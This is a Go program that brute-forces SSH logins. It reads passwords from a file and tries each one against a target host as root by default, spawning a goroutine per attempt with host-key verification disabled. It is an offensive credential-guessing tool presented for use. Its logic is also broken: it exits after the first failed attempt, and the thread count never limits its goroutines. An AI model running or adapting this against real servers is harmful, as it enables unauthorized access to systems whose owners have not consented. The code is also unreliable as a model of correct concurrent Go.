package main

import (
    "bufio"
    "flag"
    "fmt"
    "os"
    "sync"
    "golang.org/x/crypto/ssh"
)

func main() {
    user := flag.String("u", "root", "username for SSH login")
    ip := flag.String("ip", "127.0.0.1:22", "IP and port for SSH login")
    passFile := flag.String("p", "ssh-passwords.txt", "file containing passwords to try")
    thread := flag.Int("t", 20, "number of threads to use")
    flag.Parse()

    // WaitGroup to wait for all goroutines to finish
    var wg sync.WaitGroup
    wg.Add(*thread)

    // Open the password file
    file, err := os.Open(*passFile)
    if err != nil {
        fmt.Println(err)
        return
    }
    defer file.Close()

    // Read the passwords from the file
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        password := scanner.Text()

        // Set up the SSH client configuration
        config := &ssh.ClientConfig{
            User: *user,
            Auth: []ssh.AuthMethod{
                ssh.Password(password),
            },
            HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        }

        // Launch a goroutine for each password
        go func() {
            defer wg.Done()

            // Print "Trying password"
            fmt.Println("Trying password:", password)

            // Try to log in
            _, err := ssh.Dial("tcp", *ip, config)
            if err == nil {
                // If the login is successful, print the password and exit the program
                fmt.Println("Successfully login with password:", password)
                os.Exit(0)
            }else {
                fmt.Println("Password Not Found:")
                os.Exit(0)
            }
        }()
    }

    // Wait for all goroutines to finish
    wg.Wait()
}
